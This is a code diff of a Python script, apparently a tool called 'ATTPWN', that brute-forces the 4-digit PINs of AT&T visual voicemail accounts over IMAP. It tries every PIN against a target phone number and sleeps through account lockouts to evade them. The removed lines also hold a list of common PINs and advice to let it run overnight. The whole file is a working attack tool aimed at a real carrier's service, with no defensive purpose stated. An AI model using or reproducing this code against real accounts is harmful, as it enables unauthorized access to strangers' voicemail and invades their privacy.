@@ -1,44 +1,42 @@
 import imaplib
-import art
+import sys
 import time
 
-def cracker(x):
+tarNum = sys.argv[1]
+
+"""carrier = sys.argv[2]
+
+carrierServer = {"att":"vvm.mobile.att.net","tmobile":"??","verizon":"???"} #not utilized yet as i dont have the imap server for tmobile and verizon
+carrierSleep = {"att":1204,"tmobile":0,"verizon":0}
+
+carr = carrierServer[carrier]
+
+"""
+
+def crack(number,x):
     try:
-        conn = imaplib.IMAP4("vvm.mobile.att.net",143)
-        conn.login(tarNum,str(x))
-        conn.close()
-        print("[+] "+str(x))
-        input("Press enter to quit...")
-        exit()
-    except Exception as e:
-        if "invalid phone number or password, please try again" in str(e):
-            print("[-] "+str(x))
-        elif "blocked" in str(e) or ("locked" in str(e)):
-            print("[-] "+str(x))
-            print("[!] Mailbox locked! Sleeping for half hour (try letting this run while you sleep...)")
-            #turns out you only need to sleep about half an hour before mailbox lock is lifted :D
-            time.sleep(1801)
+        imap1 = imaplib.IMAP4("vvm.mobile.att.net",143)
+        imap1.login(number,x)
+        imap1.close()
+        return x
+    except Exception as err:
+        if "blocked" in str(err) or "locked" in str(err):
+            return 2
         else:
-            print("[!] "+str(e))
-            exitNow = input("Would you like to exit? ('Y' for yes, anything else for no): ")
-            if exitNow == "Y":
-                exit()
+            return 3
 
-art.tprint("ATTPWN")
-
-tarNum = input("Enter target mobile number (must be att number!): ")
-
-topPins = ["1111","2222","3333","4444","5555","6666","7777","8888","9999","0000","1234","6969","1010","0101","7890","6789","4321",tarNum[len(tarNum)-4:len(tarNum)]] #added last 4 digits of number
-
-useTop = input("Use top pins? ('Y' to use, anything else to use incremental): ")
-
-if useTop == "Y":
-    for pin in topPins:
-        cracker(pin)
-else:
-    for c in range(9999):
-        cracker(str(c).zfill(4))
-    
-    
-        
+for p in range(9999):
+    passw = str(p).zfill(4)
+    att = crack(tarNum,passw)
+    if att != 2 and (att != 3):
+        print("[+] "+str(passw))
+        break
+    elif att == 2:
+        print("[!] Mailbox locked. Sleeping for 30 minutes...")
+        time.sleep(1804) #30 minutes seems to work for at&t
+    elif att == 3:
+        print("[-] "+str(passw))
+    else:
+        print("[!] Unknown error. Maybe check your internet connection? Exiting...")
+        break
 
